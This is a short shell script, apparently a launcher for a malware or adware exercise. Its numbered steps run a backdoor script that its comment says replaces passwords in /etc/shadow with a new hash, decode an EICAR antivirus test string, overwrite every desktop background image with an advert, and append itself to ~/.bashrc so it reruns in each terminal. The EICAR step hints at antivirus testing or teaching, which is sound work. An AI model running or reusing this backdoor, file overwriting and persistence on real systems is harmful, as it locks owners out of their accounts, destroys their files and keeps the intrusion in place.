#this file will start everything

#1. backdoor
#generate a new hash and stick it in /etc/shadow, replacing current passwords
sh ./adware-backdoor-creator.sh

#2. eicar string
base64 -d ./EICAR.txt

#3. adware
for filename in /usr/share/backgrounds/*; do
    cat ./ad.jpg > $filename
done

#4. run every time a terminal is opened by this user
echo "sh $(pwd)/starthere.sh" >> ~/.bashrc